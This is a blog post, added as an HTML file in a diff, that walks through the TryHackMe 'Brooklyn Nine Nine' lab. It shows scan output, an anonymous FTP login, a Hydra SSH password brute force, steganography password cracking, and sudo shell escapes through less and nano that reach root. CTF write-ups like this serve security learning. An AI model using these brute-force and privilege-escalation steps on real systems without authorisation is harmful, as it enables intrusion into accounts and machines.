@@ -1,0 +1,165 @@
+<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> Writeup - THM - Brooklyn-NineNine -Phil Malle </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Walkthrough of Brooklyn NineNine of TryHackme.- Writeup - THM - Brooklyn-NineNine"> <meta name="keywords" content="Writeup - THM - Brooklyn-NineNine, Phil Malle, walkthroughs,TryHackeMe, Brooklyn-NineNine, Hacking, pwned"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="Phil Malle" property="og:site_name" /> <meta content="Writeup - THM - Brooklyn-NineNine" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Walkthrough of Brooklyn NineNine of TryHackme." property="og:description" /> <meta content="/blog/brooklynNineNine/" property="og:url" /> <meta content="2020-10-06T00:00:00+00:00" property="article:published_time" /> <meta content="/about/" property="article:author" /> <meta content="walkthroughs" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="Writeup - THM - Brooklyn-NineNine" /> <meta name="twitter:url" content="/blog/brooklynNineNine/" /> <meta name="twitter:description" content="Walkthrough of Brooklyn NineNine of TryHackme." /> <link rel="stylesheet" href="/assets/css/main.css" /> <!-- <link rel="stylesheet" href="/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = '' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="/assets/js/search.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!-- (you can remove the below scripts but do buy me a coffee to show some support :) --> <!-- buy me a coffeee --> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="philmalle" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">Phil Malle</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="/about" >About Me</a > </li> <li class="nav-item"> <a class="nav-link" href="/gallery" >Achievements</a > </li> <li class="nav-item"> <a class="nav-link" href="/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="/contact" >Contact</a > </li> <li class="nav-item"> <a class="nav-link" href="/links" >Links</a > </li> <li class="nav-item"> <a class="nav-link" href="/pgp" >GNUPG-Public Key</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher() " type="checkbox" name="checkbox" /> </li> </ul> </nav> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">Writeup - THM - Brooklyn-NineNine</h1> <h4 class="post-meta">Walkthrough of Brooklyn NineNine of TryHackme.</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="/blog/authors/fr3akazo1d">fr3akazo1d</a></span> </span > at <time datetime="2020-10-06 00:00:00 +0000" itemprop="datePublished" >Oct 6, 2020</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/brooklynNineNine/" ></span> <div class="post-categories"> Category : <a href="/blog/categories/walkthroughs" >walkthroughs</a > </div> </div> <div class="card-body" itemprop="articleBody"> <center> <img src="" alt="" /></center> <br /> <br /> <h1 id="general-information">General Information</h1> <table> <thead> <tr> <th>Room</th> <th>Date</th> <th>Difficulty</th> <th>Tags</th> <th>Time</th> </tr> </thead> <tbody> <tr> <td>Brooklyn NineNine</td> <td>06.10.2020</td> <td>easy</td> <td>security, nmap, gobuster, pentest</td> <td>–</td> </tr> </tbody> </table> <h1 id="used-programs">Used Programs</h1> <table> <thead> <tr> <th>Program</th> <th>Command</th> </tr> </thead> <tbody> <tr> <td>namp</td> <td>nmap -sC -sV -oN nmap/initial $ip -Pn</td> </tr> <tr> <td>ftp</td> <td>ftp $ip</td> </tr> <tr> <td>hydra</td> <td>hydra -t 16 -l j*** -P /usr/share/wordlists/rockyou.txt 10.10.93.39 ssh</td> </tr> <tr> <td>ssh</td> <td>ssh j***@10.10.93.39</td> </tr> <tr> <td>stegcracker</td> <td>s<strong>**</strong>*** brooklyn99.jpg /usr/share/wordlists/rockyou.txt</td> </tr> </tbody> </table> <h1 id="open-ports">open ports</h1> <table> <thead> <tr> <th>Port</th> <th>Service</th> <th>Version</th> </tr> </thead> <tbody> <tr> <td>21</td> <td>ftp</td> <td>vsftpd 3.0.3</td> </tr> <tr> <td>22</td> <td>ssh</td> <td>OpenSSH 7.6p1</td> </tr> <tr> <td>80</td> <td>http</td> <td>Apache httpd 2.4.29</td> </tr> </tbody> </table> <p>On this room, there where 2 Ways to get to the root flag. So i decided to check if i found both ways into the target.</p> <h2 id="walkthrough">Walkthrough</h2> <h3 id="first-way">First Way</h3> <p>First we are starting with the namp Scan on the target. Beside this, i was running a gobuster scan, but there was nothing interessting on the results.</p> <h3 id="nmap-scan">nmap Scan</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat nmap/initial    
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: nmap/initial
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ <span class="c"># Nmap 7.80 scan initiated Mon Oct  5 20:18:55 2020 as: nmap -sC -sV -oN nmap/initial 10.10.93.39</span>
+   2   │ Nmap scan report <span class="k">for </span>10.10.93.39
+   3   │ Host is up <span class="o">(</span>0.075s latency<span class="o">)</span><span class="nb">.</span>
+   4   │ Not shown: 997 closed ports
+   5   │ PORT   STATE SERVICE VERSION
+   6   │ 21/tcp open  ftp     vsftpd 3.0.3
+   7   │ | ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+   8   │ |_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+   9   │ | ftp-syst: 
+  10   │ |   STAT: 
+  11   │ | FTP server status:
+  12   │ |      Connected to ::ffff:10.11.3.139
+  13   │ |      Logged <span class="k">in </span>as ftp
+  14   │ |      TYPE: ASCII
+  15   │ |      No session bandwidth limit
+  16   │ |      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+  17   │ |      Control connection is plain text
+  18   │ |      Data connections will be plain text
+  19   │ |      At session startup, client count was 1
+  20   │ |      vsFTPd 3.0.3 - secure, fast, stable
+  21   │ |_End of status
+  22   │ 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+  23   │ | ssh-hostkey: 
+  24   │ |   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 <span class="o">(</span>RSA<span class="o">)</span>
+  25   │ |   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+  26   │ |_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 <span class="o">(</span>ED25519<span class="o">)</span>
+  27   │ 80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+  28   │ |_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+  29   │ |_http-title: Site doesn<span class="s1">'t have a title (text/html).
+  30   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+  31   │ 
+  32   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  33   │ # Nmap done at Mon Oct  5 20:19:07 2020 -- 1 IP address (1 host up) scanned in 12.41 seconds
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></code></pre></div></div> <h3 id="ftp-enumeration">FTP-Enumeration</h3> <p>It Looks Anonymous login is available on the FTP-Server. So this is my first way to check the FTP-Server.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.93.39 
+Connected to 10.10.93.39.
+220 (vsFTPd 3.0.3)
+Name (10.10.93.39:fr3akazo1d): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+226 Directory send OK.
+ftp&gt; get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+226 Transfer complete.
+119 bytes received in 0.00 secs (332.9826 kB/s)
+ftp&gt;
+</code></pre></div></div> <p>On the FTP-Server there is a file witch i downloaded. After downloading the File, we can check was is in it.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat note_to_j<span class="k">***</span>.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: note_to_jake.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ From A<span class="k">**</span>,
+   2   │ 
+   3   │ J<span class="k">***</span> please change your password. It is too weak and h<span class="k">***</span> will be mad <span class="k">if </span>someone hacks into the nine nine
+   4   │ 
+   5   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div> <p>As in the note mentioned, J*** has a week password. So we can try it to Brue-Froce the password with Hydra.</p> <h3 id="hydra-bruteforce">Hydra-BruteForce</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-t</span> 16 <span class="nt">-l</span> j<span class="k">***</span> <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 10.10.93.39 ssh                                    
+Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2020-10-05 21:04:41
+<span class="o">[</span>WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="nt">-t</span> 4
+<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~896525 tries per task
+<span class="o">[</span>DATA] attacking ssh://10.10.93.39:22/
+<span class="o">[</span>22][ssh] host: 10.10.93.39   login: jake   password: 9<span class="k">*******</span>1
+1 of 1 target successfully completed, 1 valid password found
+<span class="o">[</span>WARNING] Writing restore file because 3 final worker threads did not <span class="nb">complete </span><span class="k">until </span>end.
+<span class="o">[</span>ERROR] 3 targets did not resolve or could not be connected
+<span class="o">[</span>ERROR] 0 target did not <span class="nb">complete
+</span>Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2020-10-05 21:05
+</code></pre></div></div> <p>After a few seconds we got a password for J***</p> <p>Password: 9<strong>**</strong>*1</p> <h3 id="ssh-login">ssh login</h3> <p>Now we have the Username and the Password. We can now login into the Target with this credentials.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh j<span class="k">***</span>@10.10.93.39
+</code></pre></div></div> <p>After login, on this user, there is no User-flag located. So i tried to check other user directorys. But i don’t have any permission to do that.</p> <p>So i decided to go for root and check then the other directorys.</p> <p>First i checked the sudo -l command. And yes we can run a command with sudo rights.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>j<span class="k">***</span>@brookly_nine_nine:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>jake on brookly_nine_nine:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/l<span class="k">***</span>
+</code></pre></div></div> <h3 id="priv-escalation">Priv-Escalation</h3> <p>Now lets have a look at GTFO-Bins. If we can escalate the privilage with that application. GTFOBins:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>l<span class="k">***</span> /etc/profile
+<span class="o">!</span>/bin/sh
+</code></pre></div></div> <p>Now i have root privilage and we can check for the flags.</p> <p>proof that iam root.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@brookly_nine_nine:~# <span class="nb">whoami
+</span>root
+</code></pre></div></div> <p>Now first check for the user-flag, found three user on the target:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@brookly_nine_nine:/home# <span class="nb">ls
+</span>a<span class="k">**</span>  h<span class="k">***</span>  j<span class="k">***</span>
+<span class="sb">```</span>sh
+
+So i decided to look into the folder <span class="k">for </span>the user flag. Found user flag <span class="k">in </span>User H<span class="k">***</span>
+
+<span class="sb">```</span>sh
+root@brookly_nine_nine:/home/<span class="k">***</span><span class="c"># ls</span>
+nano.save  user.txt
+root@brookly_nine_nine:/home/<span class="k">***</span><span class="c"># cat user.txt</span>
+ee11cbb19052e40b07aac0ca060c23ee
+e<span class="k">******************************</span>e
+</code></pre></div></div> <p>We have found the user flag lets get the root flag:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@brookly_nine_nine:/root# <span class="nb">ls
+</span>root.txt
+root@brookly_nine_nine:/root# <span class="nb">cat </span>root.txt
+<span class="nt">--</span> Creator : Fsociety2006 <span class="nt">--</span>
+Congratulations <span class="k">in </span>rooting Brooklyn Nine Nine
+
+
+Enjoy!!
+</code></pre></div></div> <p>No we got the root flag.</p> <h2 id="second-way">Second Way</h2> <p>For the second way i was checking the Webserver. If i found some interessting stuff on it.</p> <p>The Webpage is only a Picture of “Brooklyn-Nine-Nine”. so i decided to have a look into the Source-Code.</p> <p>Found a note under the picture.</p> <h3 id="web-server-enumeration">Web-Server Enumeration</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p&gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen <span class="o">(</span>when scrolled to top<span class="o">)</span>, and that it scales nicely on all screen sizes.&lt;/p&gt;
+&lt;<span class="o">!</span><span class="nt">--</span> Have you ever heard of steganography? <span class="nt">--</span><span class="o">&gt;</span>
+</code></pre></div></div> <p>I download the picture and check with stegehide if there is some hidden information stored.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract <span class="nt">-sf</span> brooklyn99.jpg
+Enter passphrase:
+</code></pre></div></div> <p>For the extraction of the file i need a password. So i decided to go for a brute force attack on the password.</p> <p>After a little research i found a github project whitch is for brute-forcing a stegehide hidden note.</p> <h3 id="brute-forceing-the-picture">Brute-Forceing the Picture</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s<span class="k">*********</span> brooklyn99.jpg /usr/share/wordlists/rockyou.txt
+S<span class="k">*********</span> 2.0.9 - <span class="o">(</span>https://github.com/Paradoxis/S<span class="k">**********</span><span class="o">)</span>
+Copyright <span class="o">(</span>c<span class="o">)</span> 2020 - Luke Paris <span class="o">(</span>Paradoxis<span class="o">)</span>
+
+Counting lines <span class="k">in </span>wordlist..
+Attacking file <span class="s1">'brooklyn99.jpg'</span> with wordlist <span class="s1">'/usr/share/wordlists/rockyou.txt'</span>..
+Successfully cracked file with password: admin
+Tried 20459 passwords
+Your file has been written to: brooklyn99.jpg.out
+admin
+</code></pre></div></div> <p>The tool itself extract the file automatically.</p> <p>But i tried the password with stegehide.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract <span class="nt">-sf</span> brooklyn99.jpg                        
+Enter passphrase: 
+wrote extracted data to <span class="s2">"note.txt"</span><span class="nb">.</span>
+</code></pre></div></div> <p>A note.txt file is extracted from the picture. Lets see what is in that file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat note.txt           
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: note.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ H<span class="k">****</span> Password:
+   2   │ f<span class="k">******************</span>e
+   3   │ 
+   4   │ Enjoy!!
+───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div> <p>Now we have a Username and a password, so lets login in the the user.</p> <h3 id="ssh-login-1">ssh login</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh h<span class="k">***</span>@10.10.93.39               
+h<span class="k">***</span>@10.10.93.39<span class="s1">'s password: 
+Last login: Mon Oct  5 18:45:59 2020 from 10.11.3.139
+h***@brookly_nine_nine:~$
+</span></code></pre></div></div> <p>We get access to the target. cat the user-flag witch is located under the logged in user.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>holt@brookly_nine_nine:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+e<span class="k">******************************</span>e
+</code></pre></div></div> <p>Lets get the root flag.</p> <p>tried the commadn sudo-l and the user can run one command as sudo user:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h<span class="k">***</span>t@brookly_nine_nine:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>holt on brookly_nine_nine:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/n<span class="k">***</span>
+</code></pre></div></div> <p>lets jump to GTFO-Bins to look if we can use nano for our priv-escalation</p> <h3 id="priv-escalation-1">Priv-Escalation</h3> <p>Found a way on GTFO-Bins for my Priv-Escalation.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>bin/n<span class="k">***</span>
+^R^X
+reset<span class="p">;</span> sh 1&gt;&amp;0 2&gt;&amp;0
+</code></pre></div></div> <p>So I execudet the application and run the commands witch GFTO-Bins recommend.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Command to execute: reset<span class="p">;</span> sh 1&gt;&amp;0 2&gt;&amp;0# <span class="nb">id</span>
+</code></pre></div></div> <p>Now we have root access on the target.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="c"># whoami</span>
+root
+<span class="c">#</span>
+</code></pre></div></div> <p>We can now read the root-flag under /root.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /root/root.txt
+<span class="nt">--</span> Creator : Fsociety2006 <span class="nt">--</span>
+Congratulations <span class="k">in </span>rooting Brooklyn Nine Nine
+Here is the flag: 6<span class="k">******************************</span>5
+Enjoy!!
+</code></pre></div></div> <h2 id="summary">Summary</h2> <p>The Box was easy and there was no new stuff in it. It was pretty forward. But i was nice and i had to check my learning on this box.</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="/blog/brooklynNineNine/" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About Fr3akazo1d! </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="/assets/img/authors/freakazoid.png" alt="Fr3akazo1d!" /> </div> <div class="col-md-6"> <p class="author_bio">Cyber-Security Entusiast, CTF-Player</p> <p>Email : fr3akazo1d@protonmail.com</p> <p>Website : https://fr3akazo1d.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/fr3akazo1d" target="_blank"><i class="fab fa-github fa-fw"></i></a> </p> </div> </div> </div> </div> </div> <!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <script> var disqus_config = function () { this.page.url = "/blog/brooklynNineNine/"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/THM-Brooklyn-NineNine-Writeup"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About Phil Malle</div> <div class="card-body"> <p class="author_bio">Hi, my name is Phil Malle. This is my personal blog about technologies, Cyber-Security and other similar topics.</p><a class="github-button" href="https://github.com/PhilMalle/philmalle.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star PhilMalle/philmalle.github.io on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#walkthroughs"></div> <li class="tag-head"> <a href="/blog/categories/walkthroughs">walkthroughs</a> </li> <a name="walkthroughs"></a> <div id="#journey"></div> <li class="tag-head"> <a href="/blog/categories/journey">journey</a> </li> <a name="journey"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="/about">About Me</a> </li> <li> <a href="/gallery">Achievements</a> </li> <li> <a href="/blog">Blog</a> </li> <li> <a href="/contact">Contact</a> </li> <li> <a href="/links">Links</a> </li> <li> <a href="/pgp">GNUPG-Public Key</a> </li> </div> </div> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/sujaykundu777/devlopr-jekyll"> devlopr jekyll</a>.Hosted at <a href="https://pages.github.com">Github</a>. &copy; by Phil Malle 2021</p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> <!-- olvy releases --> <script> var OlvyConfig = { organisation: "", target: "#olvy-target", type: "sidebar", view: { showSearch: true, compact: true, showHeader: true, /* only applies when widget type is embed. you cannot hide header for modal and sidebar widgets */ showUnreadIndicator: true, unreadIndicatorColor: "#FFA13AFF", unreadIndicatorPosition: "top-right" } }; </script> <script type="text/javascript" src="https://app.olvy.co/script.js" defer="defer"></script> </body> </html>
